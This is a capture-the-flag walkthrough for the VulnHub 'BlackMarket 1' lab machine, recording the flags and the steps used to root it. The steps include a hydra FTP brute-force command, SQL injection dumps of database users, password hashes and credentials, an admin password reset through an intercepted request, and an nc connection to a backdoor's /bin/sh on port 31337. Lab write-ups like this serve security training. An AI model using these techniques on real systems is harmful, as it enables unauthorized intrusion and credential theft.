@@ -1,0 +1,278 @@
+https://www.vulnhub.com/entry/blackmarket-1,223/
+
+Objective:
+6 flags (each flag leads to another)
+1 r00t flag
+
+IP Address: 192.168.83.108
+
+Ports:
+21/tcp  open  ftp   (vsftpd 3.0.2)
+22/tcp  open  ssh   (OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7)
+80/tcp  open  http  (Apache httpd 2.4.7)
+110/tcp open  pop3  (Dovecot pop3d)
+143/tcp open  imap  (Dovecot imapd)
+993/tcp open  imaps (ssl/imap Dovecot imapd)
+995/tcp open  pop3s (sl/pop3 Dovecot pop3d)
+
+
+FLAGS:
+ flag1{Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=} (base64: CIA - Operation Treadstone)
+ flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}     (base64: Congrats Proceed Further)
+ | 3      | Flag | Find Jason Bourne Email access |
+ flag4{bm90aGluZyBpcyBoZXJl} (base64: nothing is here)
+ Flag5{RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=}  (base64: Everything is encrypted)
+ flag6{Um9vdCB0aW1l} (base64: Root time)
+r00t)
+
+
+
+
+
+Steps:
+
+website
+ - login page (doesn't appear to be sqli)
+ - flag1 in page source comments flag1{Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=}
+ - nikto: /admin/script.php, /squirrelmail/..
+
+flag1 translates to CIA - Operation Treadstone
+
+http://bourne.wikia.com/wiki/Operation_Treadstone
+gives names of staff and operatives
+try hydra on login, no luck
+
+FTP
+hydra 192.168.83.108 -L users.txt -P pass.txt -s 21 ftp -v
+users.txt = names of staff and operatives
+rockyou.txt didn't work
+pass.txt = combinations of cia, treadstone, treadstone71
+
+[21][ftp] host: 192.168.83.108   login: nicky   password: CIA
+
+only file seems to be IMP.txt
+flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}
+If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!
+
+
+WEB
+
+created wordlist for vehicle workshop combination as a directory
+found http://192.168.83.108/vworkshop/ 
+
+BlackMarket Auto Workshop
+moving through: login pages, registrations, parts store
+parts store has possible SQLI
+http://192.168.83.108/vworkshop/sparepartsstoremore.php?sparepartid=1
+
+
+SQLI
+dbms = MYSQL
+db = eworkshop
+users =
+[*] 'debian-sys-maint'@'localhost'
+[*] 'dimitri'@'localhost'
+[*] 'dimitriroundcube'@'%'
+[*] 'dimitriroundcube'@'localhost'
+[*] 'root'@'127.0.0.1'
+[*] 'root'@'::1'
+[*] 'root'@'dimitri'
+[*] 'root'@'localhost'
+passwords =
+[*] debian-sys-maint [1]:
+    password hash: *48C912A9B76C25C38269D5B8794BC721AF92CFC5
+[*] dimitri [1]:
+    password hash: *03EF70297613C190651093D0C78104A2CC2434C6
+[*] dimitriroundcube [2]:
+    password hash: *03EF70297613C190651093D0C78104A2CC2434C6
+    password hash: NULL
+[*] root [1]:
+    password hash: *45462A18E725C05606AFB6677A979E99830E0558
+databases:
+[*] BlackMarket
+[*] eworkshop
+[*] information_schema
+[*] mysql
+[*] performance_schema
+
+Database: eworkshop                                                                                                         
+[10 tables]
++-----------------+
+| billing         |
+| booking         |
+| customer        |
+| employee        |
+| service         |
+| spareparts      |
+| sparepartsorder |
+| testdrive       |
+| vehicle         |
+| vehiclestore    |
++-----------------+
+
+Database: eworkshop
+Table: employee
+[1 entry]
++-----------------+---------+------------+-------+---------+----------+------------+------------+--------------+
+| emailid         | loginid | employeeid | lname | fname   | password | contactno1 | contactno2 | employeetype |
++-----------------+---------+------------+-------+---------+----------+------------+------------+--------------+
+| admin@admin.com | admin   | 1          | Man   | Manager | IamNoob  | 4894899999 | 559009890  | Admin        |
++-----------------+---------+------------+-------+---------+----------+------------+------------+--------------+
+
+Database: eworkshop
+Table: customer
+[1 entry]
++--------+---------+------+-------+-------+---------+----------+----------+------------+------------+-------------+
+| custid | emailid | city | lname | fname | address | zipcode  | password | contactno1 | contactno2 | createddate |
++--------+---------+------+-------+-------+---------+----------+----------+------------+------------+-------------+
+| 10     | asdsa   | asda | asdsa | sadsa | asdsa   | asdsadsa | 12345    | 21312      | 12312      | 2017-11-06  |
++--------+---------+------+-------+-------+---------+----------+----------+------------+------------+-------------+
+
+Database: BlackMarket                                                                                                       
+[10 tables]
++--------------+
+| user         |
+| cart         |
+| category     |
+| customer     |
+| flag         |
+| inventory    |
+| product      |
+| sales        |
+| sales_detail |
+| supplier     |
++--------------+
+
+Database: BlackMarket
+Table: flag
+[1 entry]
++--------+------+--------------------------------+
+| FlagId | name | Information                    |
++--------+------+--------------------------------+
+| 3      | Flag | Find Jason Bourne Email access |
++--------+------+--------------------------------+
+
+Database: BlackMarket
+Table: user
+[5 entries]
++--------+--------+----------+----------------------------------+
+| userid | access | username | password                         |
++--------+--------+----------+----------------------------------+
+| 1      | 1      | admin    | cf18233438b9e88937ea0176f1311885 |
+| 2      | 2      | user     | 0d8d5cd06832b29560745fe4e1b941cf |
+| 4      | 3      | supplier | 99b0e8da24e29e4ccb5d7d76e677c2ac |
+| 5      | 2      | jbourne  | 28267a2e06e312aee91324e2fe8ef1fd |
+| 6      | 3      | bladen   | cbb8d2a0335c793532f9ad516987a41c |
++--------+--------+----------+----------------------------------+
+
+cracking: 
+user :: user
+supplier :: supplier
+
+*plus* from above: admin admin@admin.net :: IamNoob
+
+admin doesn't have much info
+
+back on main page: supplier :: supplier works
+
+from there, access to /admin
+
+
+Dimitri Volkof 	user 	***** 	Moscow Russia 	v.dimitri@kgb.gov.ru 	
+Jason Bourne 	jbourne 	***** 	Texas 	jbourne@cia.gov
+
+Has ability to change passwords, change both to 'password'
+Intercept request with proxy to change admin (id=1) to 'password'
+
+Login Success, Welcome BigBOSS! here is your flag4{bm90aGluZyBpcyBoZXJl} Jason Bourne Email access ?????
+
+
+back to squirrel mail
+jbourne :: ?????    -> literally 5 ?s
+
+Look in drafts
+
+Flag5{RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=}
+
+HELLO Friend,
+
+I have intercept the message from Russian's some how we are working on the same
+direction, however, I couldn't able to decode the message. 
+
+<Message Begins> 
+
+
+Sr Wrnrgir
+Ru blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg
+dliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl fhv
+KzhhKzhh.qkt rm liwvi gl tvg zxxvhh.
+
+</end>
+
+
+Substitution encryption:
+Hi Dimitri
+If you are reading this I might be not alive. I have place a backdoor in Blackmarket
+workshop under /kgbbackdoor folder you must have to use
+PassPass.jpg in order to get access.
+
+fake error page at /vworkshop/kgbbackdoor/backdoor.php
+download jpg at /vworkshop/kgbbackdoor/PassPass.jpg
+
+use strings PassPass.jpg gets: Pass = 5215565757312090656
+
+ (decimal to hex, reverse hexdump) 5215565757312090656 >> 4861696C4B474220 >> HailKGB
+
+Use 'HailKGB' in hidden text field
+
+BACKDOOR ACCESS
+flag6{Um9vdCB0aW1l} 
+
+
+use backdoor to connect to /bin/sh on 31337
+nc -ln 192.168.83.108 -p 31337 -v
+
+navigate around /home/.Mylife > cat .Secret
+
+I have been working on this CIA BlackMarket Project but it seems like I am not doing anything 
+right for people. Selling drugs and guns is not my business so soon I will quit the job. 
+
+About my personal life I am a sharp shooter have two kids but my wife don't like me and I am broke. Food wise I eat everything but DimitryHateApple
+
+I will add more about later! 
+
+DimitryHateApple
+DimitriHateApple
+
+ssh into server as dimitri
+try those as passwords
+
+
+root@Dimitri:~# cat THEEND.txt 
+FINALLY YOU MADE IT! 
+
+THANKS FOR PLAYING BOOT2ROOT CTF AND PLEASE DO MAIL ME ANY SUGGESTIONS @ acebomber@protomail.com 
+
+THANKS SECTALKS BRISBANE FOR HOSTING MY CTF 
+
+
+ (                      )
+      |\    _,--------._    / |
+      | `.,'            `. /  |
+      `  '              ,-'   '
+       \/_         _   (     /
+      (,-.`.    ,',-.`. `__,'
+       |/#\ ),-','#\`= ,'.` |
+       `._/)  -'.\_,'   ) ))|
+       /  (_.)\     .   -'//
+      (  /\____/\    ) )`'\
+       \ |V----V||  ' ,    \
+        |`- -- -'   ,'   \  \      _____
+ ___    |         .'    \ \  `._,-'     `-
+    `.__,`---^---'       \ ` -'
+       -.______  \ . /  ______,-
+               `.     ,'            
+
+
+./AcEb0mb3R_l0g0ff root@Dimitri:~# 
+
